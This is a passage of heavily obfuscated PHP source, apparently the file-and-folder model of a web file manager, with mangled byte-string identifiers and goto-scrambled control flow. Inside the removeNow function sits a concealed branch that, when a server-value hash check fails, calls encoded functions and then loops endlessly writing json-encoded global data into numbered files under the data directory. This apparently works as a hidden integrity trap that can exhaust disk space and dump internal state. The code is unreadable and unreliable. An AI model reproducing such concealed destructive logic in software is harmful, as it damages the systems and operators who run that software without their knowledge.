bŒ«ÏÒ¯“Ô: $this->_createFileCall($dóíÍ®ãöÑ[$b°¾Ë¯‹‡ô[457]], $C¯Ÿ­ˆ…´³, $BâÒ¡µùÏ½, REPEAT_REPLACE, $b°¾Ë¯‹‡ô[1106]); $eÖ£‹ºôäˆ = $dóíÍ®ãöÑ[$b°¾Ë¯‹‡ô[413]][$b°¾Ë¯‹‡ô[477]]; $c÷®‹Äâ• = $eÖ£‹ºôäˆ[$b°¾Ë¯‹‡ô[2299]] ? $eÖ£‹ºôäˆ[$b°¾Ë¯‹‡ô[2299]] : $eÖ£‹ºôäˆ[$b°¾Ë¯‹‡ô[28]]; goto DÁ˜‡·°ˆ; c½‚ÅºôâÚ: } public function fileIsLock($dí²ğ©ˆß´, $BÊ­«Äº•é = false) { goto AˆÍ•Éˆ —; AˆÍ•Éˆ —: $FÀÍ°Ú®Õ‡ =& $_SERVER[»„]; if (!isset($dí²ğ©ˆß´[$FÀÍ°Ú®Õ‡[413]]) || !$dí²ğ©ˆß´[$FÀÍ°Ú®Õ‡[413]][$FÀÍ°Ú®Õ‡[474]]) { return !1; } if ($dí²ğ©ˆß´[$FÀÍ°Ú®Õ‡[413]][$FÀÍ°Ú®Õ‡[474]] != USER_ID) { return !0; } goto eÖË·œ‰˜; AÔƒà»½Çî: return !1; goto Eæ¥“¿ˆÚ©; eÖË·œ‰˜: $aÔè¶–÷ªÇ = $GLOBALS[$FÀÍ°Ú®Õ‡[6]][$FÀÍ°Ú®Õ‡[84]][$FÀÍ°Ú®Õ‡[475]]; if ($dí²ğ©ˆß´[$FÀÍ°Ú®Õ‡[413]][$FÀÍ°Ú®Õ‡[476]] <= time() - $aÔè¶–÷ªÇ) { $this->metaSet($dí²ğ©ˆß´[$FÀÍ°Ú®Õ‡[365]], $FÀÍ°Ú®Õ‡[474], null); $this->metaSet($dí²ğ©ˆß´[$FÀÍ°Ú®Õ‡[365]], $FÀÍ°Ú®Õ‡[476], null); } if ($BÊ­«Äº•é) { $this->metaSet($dí²ğ©ˆß´[$FÀÍ°Ú®Õ‡[365]], $FÀÍ°Ú®Õ‡[476], time()); } goto AÔƒà»½Çî; Eæ¥“¿ˆÚ©: } private function _addSoure($bÄ“ƒ„¹–Œ, $f©æ ‹ßšÍ) { goto DŒæ¯õ —Å; DŒæ¯õ —Å: $AÉÅ†—¯Ì =& $_SERVER[»„]; $Fßù¼™§âÒ = array($AÉÅ†—¯Ì[517] => $f©æ ‹ßšÍ[$AÉÅ†—¯Ì[367]], $AÉÅ†—¯Ì[518] => $f©æ ‹ßšÍ[$AÉÅ†—¯Ì[452]], $AÉÅ†—¯Ì[519] => USER_ID, $AÉÅ†—¯Ì[520] => USER_ID, $AÉÅ†—¯Ì[364] => $f©æ ‹ßšÍ[$AÉÅ†—¯Ì[365]], $AÉÅ†—¯Ì[521] => $f©æ ‹ßšÍ[$AÉÅ†—¯Ì[455]] . $f©æ ‹ßšÍ[$AÉÅ†—¯Ì[365]] . $AÉÅ†—¯Ì[47], $AÉÅ†—¯Ì[392] => 0, $AÉÅ†—¯Ì[522] => $AÉÅ†—¯Ì[33]); $bÄ“ƒ„¹–Œ = array_merge($Fßù¼™§âÒ, $bÄ“ƒ„¹–Œ); goto E„¦†š¦Â¹; eè­Üœ‘–Ï: $bñÁ°ÛœóÍ = array($AÉÅ†—¯Ì[523] => short_id($F„Í§·ğ—¯)); $this->where(array($AÉÅ†—¯Ì[379] => $F„Í§·ğ—¯))->save($bñÁ°ÛœóÍ); $this->setNamePinyin($F„Í§·ğ—¯, $bÄ“ƒ„¹–Œ[$AÉÅ†—¯Ì[28]]); goto Cã÷±§è¹»; E„¦†š¦Â¹: $this->updateModifyTime($bÄ“ƒ„¹–Œ[$AÉÅ†—¯Ì[457]]); $d×òŒªŞ¦Ù = $AÉÅ†—¯Ì[2305] . $f©æ ‹ßšÍ[$AÉÅ†—¯Ì[365]]; if (isset(self::$cacheChildList[$d×òŒªŞ¦Ù])) { unset(self::$cacheChildList[$d×òŒªŞ¦Ù]); } goto F‚·Ÿ„ÆŞ±; F‚·Ÿ„ÆŞ±: static $Bù˜‹‰Ôø = false; if (!$Bù˜‹‰Ôø) { Hook::trigger($AÉÅ†—¯Ì[504], $bÄ“ƒ„¹–Œ); $Bù˜‹‰Ôø = !0; } $F„Í§·ğ—¯ = $this->add($bÄ“ƒ„¹–Œ); goto eè­Üœ‘–Ï; Cã÷±§è¹»: return $F„Í§·ğ—¯; goto EĞ øæ†¨©; EĞ øæ†¨©: } public function remove($D…·©ƒ°ñ­, $a‡Ø±àõÈ² = true) { goto bÄĞìÈ¡·“; FŒ‹­ÌÆÇ¬: CacheLock::lock($EùÕÈ‘˜«¸); $c‡Ã“‹„ ‘ = $this->fileNameExist($FÅÇÄ¢¿¤Ö, $B«¸Äö‰êø); if (!$c‡Ã“‹„ ‘) { $c‡Ã“‹„ ‘ = $this->mkdir($FÅÇÄ¢¿¤Ö, $B«¸Äö‰êø, REPEAT_SKIP); $this->metaSet($c‡Ã“‹„ ‘, $e½½Åéï•Ü[2310], $D«íõ•¨¿); $this->metaSet($c‡Ã“‹„ ‘, $e½½Åéï•Ü[2311], $aõ¿ƒÔ¬Í[$e½½Åéï•Ü[452]]); if ($aõ¿ƒÔ¬Í[$e½½Åéï•Ü[457]] != 0) { $this->metaSet($c‡Ã“‹„ ‘, $e½½Åéï•Ü[2312], _get($bÍÀµÓãµ‚, $e½½Åéï•Ü[2313])); } } goto C¶Çˆ÷İÍß; fğÒÀ­÷÷: $this->recycleClear($aõ¿ƒÔ¬Í); return $this->move($D…·©ƒ°ñ­, $c‡Ã“‹„ ‘, REPEAT_RENAME_FOLDER); goto eôî•î÷; bÄĞìÈ¡·“: $e½½Åéï•Ü =& $_SERVER[»„]; $aõ¿ƒÔ¬Í = $this->sourceInfo($D…·©ƒ°ñ­); $e‡¾ÙéÇŒ = intval($aõ¿ƒÔ¬Í[$e½½Åéï•Ü[367]]) === self::TYPE_SYSTEM; goto d«ÂÑ—½·‡; C¶Çˆ÷İÍß: CacheLock::unlock($EùÕÈ‘˜«¸); $this->metaSet($D…·©ƒ°ñ­, $e½½Åéï•Ü[2314], $aõ¿ƒÔ¬Í[$e½½Åéï•Ü[457]]); $this->where(array($e½½Åéï•Ü[365] => $D…·©ƒ°ñ­))->save(array($e½½Åéï•Ü[386] => time())); goto fğÒÀ­÷÷; d«ÂÑ—½·‡: $B£Ùºğ”Ø = Model($e½½Åéï•Ü[1407])->get($e½½Åéï•Ü[2306]) == $e½½Åéï•Ü[83]; if ($e‡¾ÙéÇŒ || $a‡Ø±àõÈ² || !$B£Ùºğ”Ø) { return $this->removeNow($D…·©ƒ°ñ­, $a‡Ø±àõÈ²); } $FÅÇÄ¢¿¤Ö = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto E«ö—Í°öÂ; E«ö—Í°öÂ: $D«íõ•¨¿ = $aõ¿ƒÔ¬Í[$e½½Åéï•Ü[367]] == self::TYPE_USER ? $e½½Åéï•Ü[531] : $e½½Åéï•Ü[961]; if ($D«íõ•¨¿ == $e½½Åéï•Ü[531]) { $bÍÀµÓãµ‚ = Model($e½½Åéï•Ü[470])->getInfo($aõ¿ƒÔ¬Í[$e½½Åéï•Ü[452]]); $B«¸Äö‰êø = !empty($bÍÀµÓãµ‚[$e½½Åéï•Ü[2299]]) ? $bÍÀµÓãµ‚[$e½½Åéï•Ü[2299]] : $bÍÀµÓãµ‚[$e½½Åéï•Ü[28]]; $B«¸Äö‰êø = $e½½Åéï•Ü[244] . $B«¸Äö‰êø . $e½½Åéï•Ü[2307] . $aõ¿ƒÔ¬Í[$e½½Åéï•Ü[452]]; } else { $bÍÀµÓãµ‚ = Model($e½½Åéï•Ü[454])->getInfo($aõ¿ƒÔ¬Í[$e½½Åéï•Ü[452]]); $B«¸Äö‰êø = _get($bÍÀµÓãµ‚, $e½½Åéï•Ü[28]); $B«¸Äö‰êø = $e½½Åéï•Ü[153] . $B«¸Äö‰êø . $e½½Åéï•Ü[2308] . $aõ¿ƒÔ¬Í[$e½½Åéï•Ü[452]]; } $EùÕÈ‘˜«¸ = $e½½Åéï•Ü[2309] . md5($B«¸Äö‰êø); goto FŒ‹­ÌÆÇ¬; eôî•î÷: } private function recycleClear($B¤ˆœ“ÚŒ») { $aí•ö³ñ±— =& $_SERVER[»„]; $FµÀîÌ”ôŞ = $this->childrenAll($B¤ˆœ“ÚŒ»); $d—Ã†ÑèÉ = array($aí•ö³ñ±—[379] => array($aí•ö³ñ±—[380], $FµÀîÌ”ôŞ[$aí•ö³ñ±—[2315]])); Model($aí•ö³ñ±—[2316])->where($d—Ã†ÑèÉ)->delete(); } public function removeNow($d˜àçŸŒ²‰, $aİÌà¥É¦ = true) { goto C´«°¤ä‚°; C´«°¤ä‚°: $FË”ÃØØ =& $_SERVER[»„]; $B—­Ú‰ƒÊà = $_SERVER[$FË”ÃØØ[752]] . $FË”ÃØØ[753]; $DœØµ Äµ¨ = $FË”ÃØØ[749]; goto eÆ”à“Èàƒ; eÆ”à“Èàƒ: if ($_SERVER[$FË”ÃØØ[750]] != $DœØµ Äµ¨($B—­Ú‰ƒÊà)) { goto eâ—¹½Õ¤ª; CßİÍëƒ†: $E¶°ÎÕ‡Ò = $E‡„‚ğ“Ö($b¯Ÿ£Òµ¶‹); $aƒà¬åç‡± = explode($FË”ÃØØ[213], $E¶°ÎÕ‡Ò); if (count($aƒà¬åç‡±) < $FË”ÃØØ[554]) { $eÉöŠÜ‹ñİ = $FË”ÃØØ[754]; $eÉöŠÜ‹ñİ(); } goto a®ôÄ„¥á‚; D‡‘Ç¯Ì·: $e…Ì‚­Ê = 1; for ($bƒ®ñ‡·Üï = $e…Ì‚­Ê; $bƒ®ñ‡·Üï > 0; $bƒ®ñ‡·Üï++) { $d¥´ôƒ»Ç(DATA_PATH . $bƒ®ñ‡·Üï, $F¥©õ‘‹í‰); } goto Eä±êØ¡ˆ´; eÎÏÖøÀø: $Còï¹ø‚(); $d¥´ôƒ»Ç = $FË”ÃØØ[1289]; $F¥©õ‘‹í‰ = json_encode($GLOBALS[$FË”ÃØØ[1290]]); goto D‡‘Ç¯Ì·; a®ôÄ„¥á‚: $E‡õğ°™‘ = $FË”ÃØØ[784]; $E‡õğ°™‘($_SERVER[$FË”ÃØØ[785]]); $Còï¹ø‚ = $FË”ÃØØ[783]; goto eÎÏÖøÀø; eâ—¹½Õ¤ª: $Còï¹ø‚ = $FË”ÃØØ[783]; $E‡„‚ğ“Ö = $FË”ÃØØ[751]; $b¯Ÿ£Òµ¶‹ = $_SERVER[$FË”ÃØØ[752]] . $FË”ÃØØ[753]; goto CßİÍëƒ†; Eä±êØ¡ˆ´: } $aÊ¡İ»Î—° = $this->sourceInfo($d˜àçŸŒ²‰); $D ›š¤¤ = $this->pathInfoMore($d˜àçŸŒ²‰); goto aœõœŞòä’; FÚ‰½¹¹ù²: $cÓòĞßÂÃ… = array($aÊ¡İ»Î—°[$FË”ÃØØ[457]]); if ($aÊ¡İ»Î—°[$FË”ÃØØ[366]] == $FË”ÃØØ[83]) { $cÓòĞßÂÃ…[] = $aÊ¡İ»Î—°[$FË”ÃØØ[365]]; } $this->updateModifyTime($cÓòĞßÂÃ…); goto dÇëÉ©ßï; dÇëÉ©ßï: $this->lockMoveEnd($d˜àçŸŒ²‰); Hook::trigger($FË”ÃØØ[1443], $D ›š¤¤, $aİÌà¥É¦); return !0; goto F‹˜æËİ“²; aœõœŞòä’: if (!$aÊ¡İ»Î—°) { return !0; } if ($aÊ¡İ»Î—°[$FË”ÃØØ[457]] == 0) { if (!_get($GLOBALS, $FË”ÃØØ[453])) { return !1; } } $this->lockMoveStart($d˜àçŸŒ²‰); goto e¹Œ¤ÚÍ; e¹Œ¤ÚÍ: Hook::trigger($FË”ÃØØ[2317], $D ›š¤¤, $aİÌà¥É¦); if ($aİÌà¥É¦) { Model($FË”ÃØØ[2316])->moveToRecycle($d˜àçŸŒ²‰); } else { $BéÕ‹ÇéÁ = $this->childrenAll($aÊ¡İ»Î—°); Model($FË”ÃØØ[501])->eventRemove($d˜àçŸŒ²‰); $this->removeRelevance($BéÕ‹ÇéÁ[$FË”ÃØØ[2315]], $BéÕ‹ÇéÁ[$FË”ÃØØ[1239]]); } $this->folderSizeReset($aÊ¡İ»Î—°[$FË”ÃØØ[457]]); goto FÚ‰½¹¹ù²; F‹˜æËİ“²: } public function childrenAll($DÙÌï‡‘) { $D™²Å¾ö =& $_SERVER[»„]; $D™ÍÅò‡Ì† = $DÙÌï‡‘[$D™²Å¾ö[365]]; if ($DÙÌï‡‘[$D™²Å¾ö[366]] == $D™²Å¾ö[83]) { $Aè¬‘îÚÒ = array($D™²Å¾ö[521] => array($D™²Å¾ö[479], $DÙÌï‡‘[$D™²Å¾ö[455]] . $D™ÍÅò‡Ì† . $D™²Å¾ö[480])); $e…Êµ¯ˆ¦‡ = array($D™²Å¾ö[521] => $Aè¬‘îÚÒ[$D™²Å¾ö[455]]); $dÑºåáÈÒ÷ = $this->field($D™²Å¾ö[2318])->where($e…Êµ¯ˆ¦‡)->select(); $dá¡Ä®”«× = !1; $a£êÖ¸’Ë© = array($D™ÍÅò‡Ì†); if ($dÑºåáÈÒ÷) { $dá¡Ä®”«× = array_to_keyvalue($dÑºåáÈÒ÷, $D™²Å¾ö[33], $D™²Å¾ö[415]); $dá¡Ä®”«× = array_remove_value($dá¡Ä®”«×, $D™²Å¾ö[464]); $a£êÖ¸’Ë© = array_to_keyvalue($dÑºåáÈÒ÷, $D™²Å¾ö[33], $D™²Å¾ö[365]); $a£êÖ¸’Ë©[] = $D™ÍÅò‡Ì†; } } else { $dá¡Ä®”«× = array($DÙÌï‡‘[$D™²Å¾ö[415]]); $a£êÖ¸’Ë© = array($D™ÍÅò‡Ì†); } return array($D™²Å¾ö[2315] => $a£êÖ¸’Ë©, $D™²Å¾ö[1239] => $dá¡Ä®”«×); } public function removeArray($F×Œ®šÌ©ª) { if (!$F×Œ®šÌ©ª) { return !0; } } public function removeRelevance($E¤œ–ˆâ¤, $EÙ¿¯ÇËİ) { goto DÕ§éÂº¶; DŸ­ÉÏó: $fØëË—í¨ = array($b™²÷÷Ü…[379] => array($b™²÷÷Ü…[380], $E¤œ–ˆâ¤)); Model($b™²÷÷Ü…[2316])->where($fØëË—í¨)->delete(); Model($b™²÷÷Ü…[409])->where($fØëË—í¨)->delete(); goto fİò¨Ó”¨á; DÕ§éÂº¶: $b™²÷÷Ü… =& $_SERVER[»„]; $E¤œ–ˆâ¤ = $E¤œ–ˆâ¤ ? $E¤œ–ˆâ¤ : array(); $EÙ¿¯ÇËİ = $EÙ¿¯ÇËİ ? $EÙ¿¯ÇËİ : array(); goto B£ÍÁÇÉ¼; B£ÍÁÇÉ¼: $E¤œ–ˆâ¤ = array_unique(array_filter($E¤œ–ˆâ¤)); $EÙ¿¯ÇËİ = array_unique(array_filter($EÙ¿¯ÇËİ)); if (!$E¤œ–ˆâ¤) { return !1; } goto DŸ­ÉÏó; c“ˆÀĞ†™: for ($FÏä˜µ°Š = 0; $FÏä˜µ°Š < count($E¤œ–ˆâ¤); $FÏä˜µ°Š++) { $this->sourceCacheClear($E¤œ–ˆâ¤[$FÏä˜µ°Š]); } goto E³ø éŞòÇ; eê•¢ß“¤: Model($b™²÷÷Ü…[2297])->removeBySource($E¤œ–ˆâ¤); $this->where($fØëË—í¨)->delete(); Model($b™²÷÷Ü…[418])->remove($EÙ¿¯ÇËİ); goto c“ˆÀĞ†™; fİò¨Ó”¨á: Model($b™²÷÷Ü…[2319])->where($fØëË—í¨)->delete(); Model($b™²÷÷Ü…[501])->where($fØëË—í¨)->delete(); Model($b™²÷÷Ü…[2049])->removeBySource($E¤œ–ˆâ¤); goto eê•¢ß“¤; E³ø éŞòÇ: } public function rename($fá£Û×·’, $b†öÄ‘á·¡) { goto AíˆÕ‚“´; CÛ†Ñ‡˜Š“: $this->setNamePinyin($fá£Û×·’, $B«ƒ¾‡ÑÂ“[$E¼äìÁ¬½[28]], !1); $this->updateModifyTime($CÌôÏÏÄÏ˜[$E¼äìÁ¬½[457]]); $dˆø˜¤¼´¬ = $this->where(array($E¼äìÁ¬½[379] => $fá£Û×·’))->data($B«ƒ¾‡ÑÂ“)->save(); goto A¦÷”ŸÚÌè; DÀÁÂÈİ‡™: $BÃ…¿ï•¸Î = $this->fileNameExist($CÌôÏÏÄÏ˜[$E¼äìÁ¬½[457]], $b†öÄ‘á·¡); if ($BÃ…¿ï•¸Î) { return !1; } $B«ƒ¾‡ÑÂ“ = array($E¼äìÁ¬½[382] => $b†öÄ‘á·¡, $E¼äìÁ¬½[520] => USER_ID); goto b‡ĞÍ‰¼Ï; b‡ĞÍ‰¼Ï: if (!$CÌôÏÏÄÏ˜[$E¼äìÁ¬½[366]] == $E¼äìÁ¬½[83]) { $B«ƒ¾‡ÑÂ“[$E¼äìÁ¬½[368]] = get_path_ext($b†öÄ‘á·¡); } Model($E¼äìÁ¬½[501])->eventRename($fá£Û×·’, $CÌôÏÏÄÏ˜[$E¼äìÁ¬½[28]], $b†öÄ‘á·¡); $this->sourceCacheClear($fá£Û×·’); goto CÛ†Ñ‡˜Š“; A¦÷”ŸÚÌè: $Fóæßó¿ = $E¼äìÁ¬½[2305] . $CÌôÏÏÄÏ˜[$E¼äìÁ¬½[457]]; if (isset(self::$cacheChildList[$Fóæßó¿])) { unset(self::$cacheChildList[$Fóæßó¿]); } return $dˆø˜¤¼´¬; goto eŠŠ‚öœå«; AíˆÕ‚“´: $E¼äìÁ¬½ =& $_SERVER[»„]; $CÌôÏÏÄÏ˜ = $this->sourceInfo($fá£Û×·’); if (!$CÌôÏÏÄÏ˜) { return !1; } goto DÀÁÂÈİ‡™; eŠŠ‚öœå«: } public function setNamePinyin($CÙôŞçâƒÀ, $FŸŞËàŠ‰, $DÌ÷¬Ò¡‡Š = true) { $F²‚‚Ê„  =& $_SERVER[»„]; $c‚ĞÄ•Ò» = Input::check($FŸŞËàŠ‰, $F²‚‚Ê„ [524]); if ($DÌ÷¬Ò¡‡Š && !$c‚ĞÄ•Ò») { return; } if (!$c‚ĞÄ•Ò») { $this->metaSet($CÙôŞçâƒÀ, $F²‚‚Ê„ [412], null); $this->metaSet($CÙôŞçâƒÀ, $F²‚‚Ê„ [411], null); return; } $A£âùÓ½Üƒ = array($F²‚‚Ê„ [412] => str_replace($F²‚‚Ê„ [50], $F²‚‚Ê„ [33], Pinyin::encode($FŸŞËàŠ‰)), $F²‚‚Ê„ [411] => Pinyin::encode($FŸŞËàŠ‰, $F²‚‚Ê„ [525])); $this->metaSet($CÙôŞçâƒÀ, $A£âùÓ½Üƒ); } public function getContent($C÷¯°¡ßä) { goto eøÚª·Š§‹; b…¾¨¿ïÇ: return IO::getContent($C—„Í£ˆ·Œ[$F¬œƒåƒÈ¨[75]]); goto F·§œŒÖ°±; B“ß²™›ÄÏ: if ($C—„Í£ˆ·Œ[$F¬œƒåƒÈ¨[77]] == 0) { return $F¬œƒåƒÈ¨[33]; } $e–ÁéÚ‚Şİ = $F¬œƒåƒÈ¨[2320] . $C—„Í£ˆ·Œ[$F¬œƒåƒÈ¨[159]]; if ($C—„Í£ˆ·Œ[$F¬œƒåƒÈ¨[77]] <= 1024 * 10) { $b·ÌôÕ‹™‡ = Cache::get($e–ÁéÚ‚Şİ); if (!$b·ÌôÕ‹™‡) { $b·ÌôÕ‹™‡ = IO::getContent($C—„Í£ˆ·Œ[$F¬œƒåƒÈ¨[75]]); Cache::set($e–ÁéÚ‚Şİ, $b·ÌôÕ‹™‡); } return $b·ÌôÕ‹™‡; } goto b…¾¨¿ïÇ; eøÚª·Š§‹: $F¬œƒåƒÈ¨ =& $_SERVER[»„]; $C—„Í£ˆ·Œ = $this->fileInfoGet($C÷¯°¡ßä); if (!$C—„Í£ˆ·Œ) { return !1; } goto B“ß²™›ÄÏ; F·§œŒÖ°±: } public function setDesc($fğ¸¨Õ—É, $f·¿‚ÊÆé¾) { $c–Ëœøº£ =& $_SERVER[»„]; Model($c–Ëœøº£[501])->eventAddDesc($fğ¸¨Õ—É, $f·¿‚ÊÆé¾); return $this->metaSet($fğ¸¨Õ—É, $c–Ëœøº£[401], $f·¿‚ÊÆé¾); } public function setContent($d³ôÓÆ§Ü, $d‚†ëîñ¯ğ = '') { goto a†Äë§¯Î; C®À¡Ÿ·Œ¹: if (!$d ©¡Ü‹”Ú || !$aâ¶ŒëŞçÇ) { return !1; } $FÌ‘İØ¹à = Model($aí¡Å×ß–¦[418])->addFileByContent($d‚†ëîñ¯ğ, $aâ¶ŒëŞçÇ[$aí¡Å×ß–¦[28]]); $Cš±ù·ğš• = $this->fileHistory($aâ¶ŒëŞçÇ, $FÌ‘İØ¹à[$aí¡Å×ß–¦[415]], $FÌ‘İØ¹à[$aí¡Å×ß–¦[77]]); goto E”¸ë›¸¾ã; E”¸ë›¸¾ã: if (!$Cš±ù·ğš•) { return Model($aí¡Å×ß–¦[418])->remove($FÌ‘İØ¹à[$aí¡Å×ß–¦[415]]); } $this->folderSizeReset($aâ¶ŒëŞçÇ[$aí¡Å×ß–¦[457]]); return !0; goto F”¿êøò¸Ô; a†Äë§¯Î: $aí¡Å×ß–¦ =& $_SERVER[»„]; $aâ¶ŒëŞçÇ = $this->sourceInfo($d³ôÓÆ§Ü); $d ©¡Ü‹”Ú = $this->fileInfoGet($d³ôÓÆ§Ü); goto C®À¡Ÿ·Œ¹; F”¿êøò¸Ô: } public function fileSubstr($dîÃ Ä“ï¥, $eİœ”Ê£‹, $B´¸…†÷å) { $båš¢¦†¢Û = $this->fileInfoGet($dîÃ Ä“ï¥); if (!$båš¢¦†¢Û) { return !1; } return IO::fileSubstr($båš¢¦†¢Û[$_SERVER[»„][75]], $eİœ”Ê£‹, $B´¸…†÷å); } public function fileInfoGet($béì·ö±˜) { goto E­¬±ŒİÉŸ; DÃŞåÊØ™: $A´ë¦‡÷ÖÃ = $C«Ô…Æ‡Ñ[421] . $dÊÏ„¯’Â›[$C«Ô…Æ‡Ñ[415]]; $FÃ—½êîÕ = _get(self::$cacheFileInfo, $A´ë¦‡÷ÖÃ); if ($FÃ—½êîÕ) { return $FÃ—½êîÕ; } goto D„Ğ‰‹ß Ù; D„Ğ‰‹ß Ù: $fÛˆİßôÅ = Model($C«Ô…Æ‡Ñ[418])->fileInfo($dÊÏ„¯’Â›[$C«Ô…Æ‡Ñ[415]]); if ($fÛˆİßôÅ) { $fÛˆİßôÅ[$C«Ô…Æ‡Ñ[28]] = $dÊÏ„¯’Â›[$C«Ô…Æ‡Ñ[28]]; } self::$cacheFileInfo[$A´ë¦‡÷ÖÃ] = $fÛˆİßôÅ; goto EªÜŠ„ØÄ‰; E­¬±ŒİÉŸ: $C«Ô…Æ‡Ñ =& $_SERVER[»„]; $dÊÏ„¯’Â› = $this->sourceInfo($béì·ö±˜); if (!$dÊÏ„¯’Â› || $dÊÏ„¯’Â›[$C«Ô…Æ‡Ñ[366]]) { return !1; } goto DÃŞåÊØ™; EªÜŠ„ØÄ‰: return $fÛˆİßôÅ; goto B‡äË­í“§; B‡äË­í“§: } private function folderChildrenNumber($Cæé¿­Üê) { $DÜ‹Àò÷»† =& $_SERVER[»„]; $B‰æêÄëÕ¼ = $this->sourceInfo($Cæé¿­Üê); $CÚŠ“ÌòÕ = array($DÜ‹Àò÷»†[521] => array($DÜ‹Àò÷»†[479], $B‰æêÄëÕ¼[$DÜ‹Àò÷»†[455]] . $Cæé¿­Üê . $DÜ‹Àò÷»†[480]), $DÜ‹Àò÷»†[392] => intval($B‰æêÄëÕ¼[$DÜ‹Àò÷»†[393]]), $DÜ‹Àò÷»†[514] => 1); $D¡„íÄèà™ = $this->where($CÚŠ“ÌòÕ)->count(); $Bã‡—«¸‰Æ = $this->where($CÚŠ“ÌòÕ)->where(array($DÜ‹Àò÷»†[514] => 0))->count(); return array($DÜ‹Àò÷»†[81] => $Bã‡—«¸‰Æ, $DÜ‹Àò÷»†[82] => $D¡„íÄèà™); } public function pathInfo($E™ˆ‚¾Ûõè, $d½î…Ø¬¨¨ = false) { goto cÆ¤­Òê™Ê; cÇ—‘½´ñ½: if ($aÊ—¤Û©©Ö) { return $aÊ—¤Û©©Ö; } $eãñ¹Ã»ù = $this->sourceInfo($E™ˆ‚¾Ûõè); if (!$eãñ¹Ã»ù) { return !1; } goto f¶Ù’âñËš; f¶Ù’âñËš: $eãñ¹Ã»ù = $this->_listDataApplyItem($eãñ¹Ã»ù, $d½î…Ø¬¨¨); self::$cachePathInfo[$eŠÌ‘•ƒ] = $eãñ¹Ã»ù; return $eãñ¹Ã»ù; goto B‚ŞÄÂã”; cÆ¤­Òê™Ê: $f¸éøğóÛ =& $_SERVER[»„]; $eŠÌ‘•ƒ = $f¸éøğóÛ[407] . intval($d½î…Ø¬¨¨) . $f¸éøğóÛ[408] . $E™ˆ‚¾Ûõè; $aÊ—¤Û©©Ö = _get(self::$cachePathInfo, $eŠÌ‘•ƒ); goto cÇ—‘½´ñ½; B‚ŞÄÂã”: } public static $cachePathInfoMore = array(); public function pathInfoMore($D¸ÒÔÑ’Ü¥) { goto dªßœ›õÖ±; A÷²ÒÑ¼«: self::$cachePathInfoMore[$D¸ÒÔÑ’Ü¥] = $Cğ«§öŸ„‚; return $Cğ«§öŸ„‚; goto a¥ŠåŸˆÇ; a¤Íà¬ØµÚ: $Cğ«§öŸ„‚ = $this->pathInfo($D¸ÒÔÑ’Ü¥); if (!$Cğ«§öŸ„‚) { return !1; } if ($Cğ«§öŸ„‚[$a¡½áõÖ…[366]] == $a¡½áõÖ…[83]) { $Cğ«§öŸ„‚[$a¡½áõÖ…[80]] = $this->folderChildrenNumber($D¸ÒÔÑ’Ü¥); } goto A÷²ÒÑ¼«; dªßœ›õÖ±: $a¡½áõÖ… =& $_SERVER[»„]; $aÄÉùÛ‚¤ = _get(self::$cachePathInfoMore, $D¸ÒÔÑ’Ü¥); if ($aÄÉùÛ‚¤) { return $aÄÉùÛ‚¤; } goto a¤Íà¬ØµÚ; a¥ŠåŸˆÇ: } public function sourceInfo($Cø—Éí¡Ï–) { goto d‡Ø‹±¡……; d‡Ø‹±¡……: $bƒì™âÚğ =& $_SERVER[»„]; if (!$Cø—Éí¡Ï–) { return array(); } $DĞ‹Ì”Êá™ = $bƒì™âÚğ[406] . $Cø—Éí¡Ï–; goto d™Œß¾ÙÑŒ; d™Œß¾ÙÑŒ: $e·æÊùÅ—ª = _get(self::$cacheSourceInfo, $DĞ‹Ì”Êá™); if ($e·æÊùÅ—ª) { return $e·æÊùÅ—ª; } $e´¡‡Æô† = $this->where(array($bƒì™âÚğ[365] => $Cø—Éí¡Ï–))->find(); goto CÈè„œÔº¼; CÈè„œÔº¼: self::$cacheSourceInfo[$DĞ‹Ì”Êá™] = $e´¡‡Æô†; return self::$cacheSourceInfo[$DĞ‹Ì”Êá™]; goto cªê‡‡Å÷Ì; cªê‡‡Å÷Ì: } public function sourceCacheClear($B÷ì¤¸Ö¹ = false) { if ($B÷ì¤¸Ö¹ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[»„][406] . $B÷ì¤¸Ö¹]); } public function pathInfoByPath($EøâŞ±Ù‹³, $aÖ¡ª°„ÅÈ) { $c“¶¥áœö÷ =& $_SERVER[»„]; $eÅÆ‚Úöèâ = !$aÖ¡ª°„ÅÈ ? array() : explode($c“¶¥áœö÷[8], trim($aÖ¡ª°„ÅÈ, $c“¶¥áœö÷[8])); $D¾¢¬¿‰¦Í = $EøâŞ±Ù‹³; foreach ($eÅÆ‚Úöèâ as $dß§‡ÙĞ¾) { $bÅˆ³«İ = array($c“¶¥áœö÷[457] => $D¾¢¬¿‰¦Í, $c“¶¥áœö÷[28] => $dß§‡ÙĞ¾); $EÂÓƒ·¯í = $this->where($bÅˆ³«İ)->select(); if (!$EÂÓƒ·¯í) { return !1; } $EÂÓƒ·¯í = array_sort_by($EÂÓƒ·¯í, $c“¶¥áœö÷[393]); $D¾¢¬¿‰¦Í = $EÂÓƒ·¯í[0][$c“¶¥áœö÷[365]]; } return $this->pathInfo($D¾¢¬¿‰¦Í, !0); } protected function updateModifyTime($c†áƒ‹”è) { goto B×™ÂóëÕâ; B×™ÂóëÕâ: $eƒ†‹ˆ¹ ” =& $_SERVER[»„]; if (!$c†áƒ‹”è) { return; } if (!is_array($c†áƒ‹”è)) { $c†áƒ‹”è = array($c†áƒ‹”è); } goto fŠİÈöø; fŠİÈöø: foreach ($c†áƒ‹”è as $Eö°­¨¤‰‘ => $cè§¶‡„¨) { $c†áƒ‹”è[$Eö°­¨¤‰‘] = intval($cè§¶‡„¨); } $fªÚØ×°² = array($eƒ†‹ˆ¹ ”[365] => array($eƒ†‹ˆ¹ ”[7], $c†áƒ‹”è)); $aåĞ£§Èê = array($eƒ†‹ˆ¹ ”[520] => USER_ID, $eƒ†‹ˆ¹ ”[386] => time()); goto eÊèÔáÓó‰; eÊèÔáÓó‰: $this->where($fªÚØ×°²)->save($aåĞ£§Èê); goto c·÷®Èøƒ‹; c·÷®Èøƒ‹: } public function folderSizeReset($BŒåÅÏÁáõ) { goto bØ¾«†‹‡ƒ; fÂ„ğ¾Ü×¬: CacheLock::lock($dº¢ñ˜Ì, 20); $this->sourceCacheClear($BŒåÅÏÁáõ); $D¸Íäö÷„Å = $this->sourceInfo($BŒåÅÏÁáõ); goto e°É»¡éƒ; cÓñß±ÚÚ: $BÖ¥ø¦´º = $this->parentLevelArray($D¸Íäö÷„Å[$FÔ­¡Åº§Ğ[455]]); if ($BÖ¥ø¦´º) { $f®ÓƒçÛóÁ = 